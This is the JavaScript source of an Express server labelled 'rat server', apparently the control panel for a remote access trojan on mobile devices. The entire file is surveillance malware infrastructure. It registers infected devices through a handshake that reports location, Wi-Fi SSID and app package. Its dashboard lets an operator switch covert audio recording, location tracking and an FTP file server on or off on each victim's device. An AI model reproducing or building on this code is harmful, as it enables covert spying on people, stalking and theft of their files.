/*
 * rat server
 *
 */

var express = require('express');
var mongoose = require('mongoose');
var morgan = require('morgan');
var jade = require('jade');

var app = express();
var PORT_NUMBER = process.argv[2]; // to start: "node server.js [port]"

// connect to the database
// mongoose.connect('mongodb://localhost/dagstaatje-database');
// var Dagstaat = require('./schemas/dagstaat');
//
// TODO list all connections
// have actions next to each one to turn on and off stuff
//

app.use(morgan(':date[clf] :remote-addr :method :url :res[content-length] - :response-time ms'));

app.post('/handshake/:id/:version/:package/:ssid/:isAudioStarted/:isLocationStarted/:ftpServerStarted/:location',
		function(req, res) {

			connectionManager.add(req.params.id, req.params.isLocationStarted,
					req.params.isAudioStarted, req.params.ftpServerStarted,
					req.params.location);

			var connection = connectionManager.getOneById(req.params.id);
			var actions = {
				startAudio    : connection.audio,
				startLocation : connection.locationStarted,
				startFTPServer: connection.ftpServ
			};

			res.send(actions);
		});

app.get('/dashboard', function(req, res) {
	var head = "<html> <head> </head> <body> ";
	var content = "";
	var connections = connectionManager.connections;
	for(var i = 0; i < connections.length; i++) {
		// first link to detail view
		content += "\r\n<p><a href=\"";
		content += "/detailView/";
		content += connections[i].id;
		content += "\">";
		content += connections[i].id;
		content += " " + connections[i].age;
		content += "</a>";
		// link to start stop location
		content += " " + "location started: ";
		content += "<a href=\"";
		content += "/toggleLocation/";
		content += connections[i].id;
		content += "\">";
		content += " " + connections[i].locationStarted;
		content += "</a>";
		// link to start stop audio
		content += " " + "audio started: ";
		content += "<a href=\"";
		content += "/toggleAudio/";
		content += connections[i].id;
		content += "\">";
		content += " " + connections[i].audio;
		content += "</a>";
		// link to start stop ftp server
		content += " " + "ftpServer started: ";
		content += "<a href=\"";
		content += "/toggleFtpServer/";
		content += connections[i].id;
		content += "\">";
		content += " " + connections[i].ftpServ;
		content += "</a>";
		content += " " + "last location: ";
		content += "<a target=\"_blank\" href=\"";
		content += "http://maps.google.com/maps?q=loc:";
		content += connections[i].location;
		content += "\">";
		content += " " + connections[i].location;
		content += "</a>";
	}
	var foot = "\r\n</body> </html>";
	var page = head + content + foot;
	res.send(page);
});

app.get('/detailView/:id', function (req, res) {
	var head = "<html> <head> </head> <body> ";
	var connection = connectionManager.getOneById(req.params.id);
	var content = connection;
	var foot = "\r\n</body> </html>";
	var page = head + content + foot;
	res.send(page);
});

app.get('/toggleFtpServer/:id', function (req, res) {
	var connection = connectionManager.getOneById(req.params.id);
	if(connection.ftpServ === true || connection.ftpServ === "true"){
		connection.ftpServ = false;
	} else {
		connection.ftpServ = true;
	}
	res.redirect('/dashboard');
});

app.get('/toggleLocation/:id', function (req, res) {
	var connection = connectionManager.getOneById(req.params.id);
	if(connection.locationStarted === true || connection.locationStarted === "true"){
		connection.locationStarted = false;
	} else {
		connection.locationStarted = true;
	}
	res.redirect('/dashboard');
});

app.get('/toggleAudio/:id', function (req, res) {
	var connection = connectionManager.getOneById(req.params.id);
	if(connection.audio === true || connection.audio === "true"){
		connection.audio = false;
	} else {
		connection.audio = true;
	}
	res.redirect('/dashboard');
});

var connectionManager = {
	connections: [],
	add: function(id, locationStarted, audio, ftpServ, location){
		if(this.getOneById(id) === undefined){
			this.connections.push( {
				id: id,
				age: Date.now(),
				locationStarted: locationStarted,
				audio: audio,
				ftpServ: ftpServ,
				location: location
			});
		}
		this.clean();
	},
	clean: function(){
		var timeout = 60000;
		for(var i = 0; i < this.connections.length; i++){
			if(this.connections[i].age < (Date.now() - timeout)){
				var index = this.connections.indexOf(this.connections[i]);
				this.connections.splice(index, 1);
			}
		}
	},
	getOneById: function(id){
		for(var i = 0; i < this.connections.length; i++){
			if(this.connections[i].id === id) {
				return this.connections[i];
			}
		}
	}
};

// start the server
var server = app.listen(PORT_NUMBER, function () {
	var host = server.address().address;
	var port = server.address().port;

	console.log('listening at %s:%s', host, port);
});

